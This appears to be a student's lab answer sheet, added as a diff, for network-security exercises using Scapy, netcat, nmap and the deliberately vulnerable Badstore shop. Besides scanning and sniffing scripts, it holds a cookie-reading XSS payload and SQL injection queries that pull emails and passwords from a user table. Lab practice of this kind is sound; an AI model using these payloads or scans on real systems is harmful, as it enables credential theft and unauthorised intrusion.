@@ -1,0 +1,311 @@
+1a Badstore
+1b
+sudo python3
+from scapy.all import *
+myframe=Ether()/IP() 
+myframe.show()
+myframe.summary()
+
+
+packet=Ether()/ARP()
+packet.show()
+packet.summary()
+
+
+1c
+
+nano port_scan.sh
+inside
+#!/bin/bash
+
+host="www.example.com"
+
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+
+for ((port=start_port; port<=end_port; port++))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+chmod +x port_scan.sh
+
+./port_scan.sh
+
+------------------------------------------------------
+
+2a badstore
+2b
+sudo python3
+from scapy.all import *
+pac=sniff(count=10)
+pac.summary()
+
+
+2c
+1st termianl
+nc -vlp 1234
+2nd terminal
+nc localhost 1234
+
+------------------------------------------------------
+
+
+3a
+sudo python3
+from scapy.all import *
+result, unanswered = traceroute(["www.example.com", "www.google.com"], maxttl=20)
+result.show()
+
+3b
+nc example.com 80
+GET / HTTP/1.1
+Host: example.com
+
+HEAD / HTTP/1.1
+Host: example.com
+
+3c 
+nmap -sn 127.0.0.1
+
+nmap -sn 127.0.0.1/24
+
+------------------------------------------------------
+
+
+4a
+ifconfig
+nano scanner.py
+inside 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "10.0.2.15/24"   
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+
+print("IP Address\t\tMAC Address")
+print("-----------------------------------------")
+
+for element in clients:
+    print(element[1].psrc + "\t\t" + element[1].hwsrc)
+
+
+sudo python3 scanner.py
+
+4b
+
+nc -l -p 5000
+http://localhost:5000
+
+in terminal after few seconds 
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: nooblinux
+
+Hello from Netcat!
+
+4c nmap -sn 127.0.0.100-200
+nmap -sn 127.0.0.0/24
+
+------------------------------------------------------
+
+
+5a Badstore
+<script>alert(document.cookie)</script>
+
+5b
+same as 1c
+
+5c 
+nmap 127.0.1.1
+
+nmap -sV 127.0.1.1
+
+------------------------------------------------------
+
+
+6a Badstore(same as 5a)
+<script>alert(document.cookie)</script>
+
+6b 
+nmap -O 127.0.1.1
+
+nmap -A 127.0.1.1
+
+6c Badstore
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 -- 
+
+------------------------------------------------------
+
+7a
+sudo python3
+
+from scapy.all import *
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+open wwire shark and search for icmp then re run the below command 
+send(IP(dst="8.8.8.8")/ICMP())
+
+
+ans, unans = sr(packet, timeout=2)
+ans[0]
+ans[0][1].show()
+
+7b
+nc -l -p 8080 < image.jpg
+
+or 
+
+printf "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n" | cat - lion.jpeg | nc -l -p 8080
+
+http://localhost:8080
+
+7c Badstore
+x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from
+itemdb -- 
+
+------------------------------------------------------
+
+8a
+import socket
+
+target_ip = socket.gethostbyname("www.example.com")
+print("Target IP:", target_ip)
+
+
+from scapy.all import *
+import socket
+
+# Resolve domain to IP
+target_ip = socket.gethostbyname("www.example.com")
+
+# Ports to scan
+ports = [22, 80, 443]
+
+print(f"Scanning target: {target_ip}")
+
+# SYN Scan
+for port in ports:
+    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+
+    if response:
+        if response.haslayer(TCP):
+            if response[TCP].flags == "SA":
+                print(f"Port {port} is OPEN")
+                
+                # Send RST to close connection properly
+                send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)
+                
+            elif response[TCP].flags == "RA":
+                print(f"Port {port} is CLOSED")
+    else:
+        print(f"Port {port} is FILTERED or NO RESPONSE")
+
+8b 
+nmap --script vuln 127.0.1.1
+
+nmap --script vuln 127.0.1.1 -oN txtgh.txt
+
+8c Badstore
+
+------------------------------------------------------
+
+
+9a 
+same as 7b
+9b
+same as 4c
+
+9c Badstore
+
+------------------------------------------------------
+
+
+10a
+nano icmp_monitor.py
+
+from scapy.all import *
+
+# Callback function (runs every time a packet is captured)
+def packet_callback(packet):
+    
+    # Check if packet has IP layer
+    if packet.haslayer(IP):
+        
+        # Check if protocol is ICMP (protocol number = 1)
+        if packet[IP].proto == 1:
+            print(f"ICMP packet detected from {packet[IP].src} to {packet[IP].dst}")
+
+# Start sniffing
+sniff(prn=packet_callback, filter="icmp", store=0)
+
+
+sudo python3 icmp_monitor.py
+
+in another terminal run
+ping 8.8.8.8
+
+10b
+same as 5c
+
+10c Badstore
+
+------------------------------------------------------
+
+
+11a
+nano scap.py 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1, verbose=False)[0]
+
+for element in clients:
+    print(element[1].psrc + "  " + element[1].hwsrc)
+
+ sudo python3 scap.py 
+
+
+11b
+same as 7b
+
+11 c Badstore
+
+------------------------------------------------------
+
+12 a
+nano traceroute.py
+from scapy.all import *
+
+# Perform traceroute to multiple targets
+result, unanswered = traceroute(
+    ["www.example.com", "www.google.com"],
+    maxttl=20
+)
+
+# Display result
+result.show()
+
+sudo python3 traceroute.py
+
+12b
+same as 7b
+
+12 c
+Badstore
